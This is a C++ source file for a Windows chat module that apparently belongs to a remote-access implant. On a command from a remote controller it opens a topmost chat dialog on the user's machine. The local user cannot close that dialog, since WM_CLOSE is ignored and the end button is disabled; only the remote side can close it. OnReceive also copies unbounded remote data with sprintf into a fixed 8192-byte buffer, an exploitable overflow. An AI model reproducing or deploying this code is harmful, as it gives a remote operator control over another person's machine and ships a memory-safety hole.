#include "stdio.h"
#include "ChatManager.h"

CChatManager::CChatManager(CClientSocket *pClient):CManager(pClient)
{
	m_hWnd = NULL;
	BYTE	bToken;
	bToken = TOKEN_CHAT_START;
	Send((LPBYTE)&bToken, sizeof(bToken));
	WaitForDialogOpen();
	HANDLE hThread = CreateThread(NULL,0,MessageLoopProc,this,0,NULL);
	if (hThread) CloseHandle(hThread);
}

CChatManager::~CChatManager()
{
	if (m_hWnd)
	{
		SendMessage(m_hWnd,WM_USER+1,NULL,NULL);
	}
}

DWORD WINAPI CChatManager::MessageLoopProc(LPVOID lParam)
{
	HGLOBAL hGlobal;
	LPBYTE lpBuffer;
	LPDLGTEMPLATE lpTemplate;
	LPWORD lpWord;
	LPWSTR lpCaption;
	LPWSTR lpFontName;
	LPDLGITEMTEMPLATE lpItemTemplate;
	
	hGlobal = GlobalAlloc(GMEM_ZEROINIT, 256);
	if (hGlobal == NULL)
		return -1;
	lpBuffer = (LPBYTE)GlobalLock(hGlobal);
	if (lpBuffer == NULL)
	{
		GlobalFree(hGlobal);
		return -1;
	}
	
	// Define a dialog box
	lpTemplate = (LPDLGTEMPLATE)lpBuffer;
	lpTemplate->style = DS_SETFONT|DS_MODALFRAME|DS_CENTER|WS_MINIMIZEBOX|WS_POPUP|WS_CAPTION|WS_SYSMENU;
	lpTemplate->cdit = 4;
	lpTemplate->x = 0;
	lpTemplate->y = 0;
	lpTemplate->cx = 235;
	lpTemplate->cy = 155;
	lpWord = (LPWORD)(lpTemplate + 1);
	*lpWord++ = 0;      // no menu
	*lpWord++ = 0;      // predefined dialog box class (by default)
	lpCaption = L"";
	wcscpy((wchar_t *)lpWord, lpCaption);
	lpWord = (LPWORD)((LPBYTE)lpWord + (wcslen(lpCaption) + 1) * sizeof(WCHAR));
	*lpWord++ = 10;     // font size
	lpFontName = L"宋体";
	wcscpy((wchar_t *)lpWord, lpFontName);
	lpWord = (LPWORD)((LPBYTE)lpWord + (wcslen(lpFontName) + 1) * sizeof(WCHAR));
	
	// Define a new message edit
	lpItemTemplate = (LPDLGITEMTEMPLATE)(((DWORD_PTR)lpWord + 3) & ~3);
	lpItemTemplate->style = ES_MULTILINE|ES_AUTOVSCROLL|WS_VSCROLL|WS_BORDER|WS_TABSTOP|WS_VISIBLE;
	lpItemTemplate->x = 3;
	lpItemTemplate->y = 113;
	lpItemTemplate->cx = 170;
	lpItemTemplate->cy = 38;
	lpItemTemplate->id = IDC_EDIT_NEWMSG;
	lpWord = (LPWORD)(lpItemTemplate + 1);
	*lpWord++ = 0xFFFF; // indicating atom value
	*lpWord++ = 0x0081; // edit class atom
	lpCaption = L"";
	wcscpy((wchar_t *)lpWord, lpCaption);
	lpWord = (LPWORD)((LPBYTE)lpWord + (wcslen(lpCaption) + 1) * sizeof(WCHAR));
	*lpWord++ = 0;      // no creation data
	
	// Define a send message button
	lpItemTemplate = (LPDLGITEMTEMPLATE)(((DWORD_PTR)lpWord + 3) & ~3);
	lpItemTemplate->style = BS_DEFPUSHBUTTON|WS_TABSTOP|WS_VISIBLE;
	lpItemTemplate->x = 178;
	lpItemTemplate->y = 116;
	lpItemTemplate->cx = 54;
	lpItemTemplate->cy = 14;
	lpItemTemplate->id = IDC_BUTTON_SEND;
	lpWord = (LPWORD)(lpItemTemplate + 1);
	*lpWord++ = 0xFFFF; // indicating atom value
	*lpWord++ = 0x0080; // button class atom
	lpCaption = L"发送消息";
	wcscpy((wchar_t *)lpWord, lpCaption);
	lpWord = (LPWORD)((LPBYTE)lpWord + (wcslen(lpCaption) + 1) * sizeof(WCHAR));
	*lpWord++ = 0;      // no creation data
	
	// Define an end chat button
	lpItemTemplate = (LPDLGITEMTEMPLATE)(((DWORD_PTR)lpWord + 3) & ~3);
	lpItemTemplate->style = WS_DISABLED|WS_TABSTOP|WS_VISIBLE;
	lpItemTemplate->x = 178;
	lpItemTemplate->y = 133;
	lpItemTemplate->cx = 54;
	lpItemTemplate->cy = 14;
	lpItemTemplate->id = IDC_BUTTON_END;
	lpWord = (LPWORD)(lpItemTemplate + 1);
	*lpWord++ = 0xFFFF; // indicating atom value
	*lpWord++ = 0x0080; // button class atom
	lpCaption = L"结束交谈";
	wcscpy((wchar_t *)lpWord, lpCaption);
	lpWord = (LPWORD)((LPBYTE)lpWord + (wcslen(lpCaption) + 1) * sizeof(WCHAR));
	*lpWord++ = 0;      // no creation data
	
	// Define a chat log edit
	lpItemTemplate = (LPDLGITEMTEMPLATE)(((DWORD_PTR)lpWord + 3) & ~3);
	lpItemTemplate->style = ES_MULTILINE|ES_AUTOVSCROLL|ES_READONLY|WS_VSCROLL|WS_BORDER|WS_TABSTOP|WS_VISIBLE;
	lpItemTemplate->x = 3;
	lpItemTemplate->y = 3;
	lpItemTemplate->cx = 229;
	lpItemTemplate->cy = 107;
	lpItemTemplate->id = IDC_EDIT_CHATLOG;
	lpWord = (LPWORD)(lpItemTemplate + 1);
	*lpWord++ = 0xFFFF; // indicating atom value
	*lpWord++ = 0x0081; // edit class atom
	lpCaption = L"";
	wcscpy((wchar_t *)lpWord, lpCaption);
	lpWord = (LPWORD)((LPBYTE)lpWord + (wcslen(lpCaption) + 1) * sizeof(WCHAR));
	*lpWord++ = 0;      // no creation data
	
	CChatManager *pThis = (CChatManager *)lParam;
	pThis->m_hWnd = CreateDialogIndirectParam(NULL,lpTemplate,NULL,ChatDialogProc,(LPARAM)pThis);
	GlobalUnlock(hGlobal);
	GlobalFree(hGlobal);
	if (pThis->m_hWnd)
	{
		SendMessage(GetDlgItem(pThis->m_hWnd,IDC_EDIT_NEWMSG),EM_SETLIMITTEXT,8158,0);
		SetWindowPos(pThis->m_hWnd,HWND_TOPMOST,0,0,0,0,SWP_NOSIZE|SWP_NOMOVE);
		//ShowWindow(pThis->m_hWnd,SW_SHOW);
		
		MSG msg;
		while(GetMessage(&msg,NULL,0,0))
		{
			if(!IsDialogMessage(pThis->m_hWnd,&msg))
			{
				TranslateMessage(&msg); 
				DispatchMessage(&msg); 
			}
		}
	}
	return 0;
}

INT_PTR CALLBACK CChatManager::ChatDialogProc(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam)
{
	CChatManager *pThis = (CChatManager *)GetWindowLongPtr(hDlg,GWLP_USERDATA);
	switch(uMsg)
	{
	case WM_INITDIALOG:
		SetWindowLongPtr(hDlg,GWLP_USERDATA,(LONG_PTR)lParam);
		SetClassLong(hDlg,GCL_HICON,(LONG)LoadIcon(GetModuleHandle(NULL),MAKEINTRESOURCE(IDI_CHAT)));
		return TRUE;
	case WM_COMMAND:
		if (LOWORD(wParam) == IDC_BUTTON_SEND)
		{
			char str[8159];
			GetDlgItemText(hDlg,IDC_EDIT_NEWMSG,str,sizeof(str));
			if (strcmp(str,"")==0)
			{
				SetFocus(GetDlgItem(hDlg,IDC_EDIT_NEWMSG));
				return TRUE; // 发送消息为空不处理
			}
			pThis->Send((LPBYTE)str,strlen(str)+1);
			SYSTEMTIME st;
			GetLocalTime(&st);
			char Text[8192]={0};
			sprintf(Text,"%s %d/%d/%d %d:%02d:%02d\r\n  %s\r\n\r\n","自己:",
				st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond,str);
			HWND hEditChatLog=GetDlgItem(hDlg,IDC_EDIT_CHATLOG);
			int nEditChatLogLen=GetWindowTextLength(hEditChatLog);
			if (nEditChatLogLen >= 20000)
			{
				SetWindowText(hEditChatLog,"");
				nEditChatLogLen=GetWindowTextLength(hEditChatLog);
			}
			SendMessage(hEditChatLog,EM_SETSEL,nEditChatLogLen,nEditChatLogLen);
			SendMessage(hEditChatLog,EM_REPLACESEL,FALSE,(LPARAM)Text);
			//SendMessage(edit,WM_VSCROLL,MAKEWPARAM(SB_BOTTOM,0),0);
			SetDlgItemText(hDlg,IDC_EDIT_NEWMSG,"");
			SetFocus(GetDlgItem(hDlg,IDC_EDIT_NEWMSG));
			return TRUE;
		}
		break;
	case WM_CLOSE:
		return 0;
	case WM_USER+1:
		DestroyWindow(hDlg);
		return TRUE;
	case WM_DESTROY:
		PostQuitMessage(0);
		return TRUE;
	default:
		break;
	}
	return FALSE;
}

void CChatManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == COMMAND_NEXT && nSize == 1)
	{
		NotifyDialogIsOpen();
		return;
	}
	if (lpBuffer[0] == COMMAND_CHAT_CLOSE && nSize == 1)
	{
		SendMessage(m_hWnd,WM_USER+1,NULL,NULL);
		return;
	}
	SYSTEMTIME st;
	GetLocalTime(&st);
	char Text[8192]={0};
	sprintf(Text,"%s %d/%d/%d %d:%02d:%02d\r\n  %s\r\n\r\n","对方:",
		st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond,lpBuffer);
	HWND hEditChatLog=GetDlgItem(m_hWnd,IDC_EDIT_CHATLOG);
	int nEditChatLogLen=GetWindowTextLength(hEditChatLog);
	if (nEditChatLogLen >= 20000)
	{
		SetWindowText(hEditChatLog,"");
		nEditChatLogLen=GetWindowTextLength(hEditChatLog);
	}
	SendMessage(hEditChatLog,EM_SETSEL,nEditChatLogLen,nEditChatLogLen);
	SendMessage(hEditChatLog,EM_REPLACESEL,FALSE,(LPARAM)Text);
	//SendMessage(edit,WM_VSCROLL,MAKEWPARAM(SB_BOTTOM,0),0);
	ShowWindow(m_hWnd, SW_RESTORE);
}
